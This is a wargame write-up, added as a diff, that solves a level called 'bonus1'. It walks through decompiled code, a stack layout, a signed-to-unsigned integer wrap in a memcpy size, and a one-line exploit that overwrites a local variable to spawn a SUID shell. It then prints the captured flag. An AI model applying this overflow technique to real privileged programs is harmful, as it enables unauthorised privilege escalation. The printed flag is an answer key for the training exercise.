@@ -1,0 +1,100 @@
+# Bonus 1
+
+Binary: 32-bit ELF, SUID bonus2, dynamically linked.
+
+## Analysis
+
+### Ghidra output
+
+```c
+int main(int argc, char **argv) {
+    char buf[40];
+    int n;
+
+    n = atoi(argv[1]);
+    if (n < 10) {
+        memcpy(buf, argv[2], n * 4);
+        if (n == 0x574f4c46) {
+            execl("/bin/sh", "sh", 0);
+        }
+        return 0;
+    }
+    return 1;
+}
+```
+
+`0x574f4c46` is `"FLOW"` read as a little-endian 32-bit int (F=0x46, L=0x4c, O=0x4f, W=0x57).
+
+Two checks on the same variable contradict each other: `n < 10` AND `n == 0x574f4c46` (1,464,816,710). No single value passes both. So the shell path is unreachable through normal control flow.
+
+### Stack layout
+
+From `disas main`:
+
+```
+sub    $0x40,%esp                  ; frame of 0x40 bytes
+...
+mov    %eax,0x3c(%esp)             ; n at esp+0x3c
+...
+lea    0x14(%esp),%eax              ; buf at esp+0x14
+mov    %ecx,0x8(%esp)               ; memcpy size (n*4)
+mov    %edx,0x4(%esp)               ; src (argv[2])
+mov    %eax,(%esp)                  ; dst (buf)
+call   memcpy
+cmpl   $0x574f4c46,0x3c(%esp)       ; compare n against "FLOW"
+```
+
+`buf` sits at `esp+0x14`, `n` at `esp+0x3c`. Distance = 0x3c minus 0x14 = 0x28 = 40 bytes. So byte 40 of the copy lands exactly on the first byte of `n`.
+
+## The bug
+
+`memcpy(buf, argv[2], n * 4)`: the size argument is computed as `n * 4`.
+
+1. `n` is checked signed (`jle` on `0x9`), so a negative `n` passes the bound.
+2. `n * 4` is computed as a 32-bit int, then passed to memcpy which takes `size_t` (unsigned 32-bit). A negative `n` whose multiplication by 4 wraps around to a small positive value becomes a small memcpy size.
+3. If bytes 40 to 43 of argv[2] are controlled, they overwrite `n` itself. Set them to `"FLOW"` and the post-memcpy check passes.
+
+### Finding the magic `n`
+
+Pick `n` such that `(n * 4) mod 2^32 == 44` and `n < 10` as signed int.
+
+`4n ≡ 44 (mod 2^32)` → `n ≡ 11 (mod 2^30)`.
+
+Solutions (as signed int):
+- `n = 11`: positive, fails `n < 10`.
+- `n = 11 + 2^30 = 1073741835`: positive, fails.
+- `n = 11 + 2 * 2^30 = 2147483659`: overflows to `-2147483637`. Passes.
+- `n = 11 + 3 * 2^30 = 3221225483 = 0xC000000B`: as signed = `-1073741813`. Passes.
+
+`-1073741813` is the tidy pick.
+
+Check: `0xC000000B * 4 = 0x3_0000002C`, truncated to 32 bits = `0x2C` = 44. memcpy copies 44 bytes.
+
+## Exploit
+
+```bash
+./bonus1 -1073741813 $(python -c 'print "A"*40 + "FLOW"')
+```
+
+- argv[1] = `-1073741813` → `n = 0xC000000B`, passes `n < 10` (signed).
+- argv[2] = 40 A's + "FLOW" = 44 bytes.
+- memcpy writes 40 A's into `buf`, then 4 bytes "FLOW" onto `n`.
+- `n` is now `0x574F4C46`. The equality check passes.
+- `execl("/bin/sh", "sh", 0)` fires under the SUID bonus2 identity.
+
+```
+$ cat /home/user/bonus2/.pass
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+```
+
+Flag: `579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245`
+
+## Notes
+
+### Why `n * 4` instead of `n`?
+
+Likely an ancient `sizeof(int)` multiplier from when the author imagined copying an array of `int`s. The cast to `size_t` during the memcpy call is where signed wraps to unsigned and the exploit opens up.
+
+### Variable overwrite vs. return address overwrite
+
+Classic stack-buffer-overflow exploits target the saved return address. Here the overflow is only 4 bytes past `buf`, nowhere near the saved EIP at `ebp+4`. Instead it overwrites a stack local that gates a win condition. No shellcode, no ret hijack, just flipping one integer.
